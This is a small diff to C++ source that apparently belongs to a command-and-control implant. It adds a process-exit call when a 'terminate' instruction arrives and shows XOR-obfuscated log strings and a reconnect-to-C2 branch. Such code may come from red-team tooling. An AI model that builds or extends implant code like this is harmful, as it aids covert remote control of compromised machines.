@@ -273,6 +273,7 @@ void PerformTaskLoop(sh_context* ctx, client_message* msg_buf, server_response* 
             had_task = false;
         } else if (resp_buf->resp_type == RESP_TYPE_TERMINATE) {
             AesLogger::LogDebug(&(ctx->log_ctx), "Received termination instruction."_xor);
+            ctx->fp.fp_ExitProcess(0);
             return;
         } else if (resp_buf->resp_type == RESP_TYPE_RECONNECT) {
             AesLogger::LogDebug(&(ctx->log_ctx), "Received reconnect instruction from C2 server. Resending handshake."_xor);
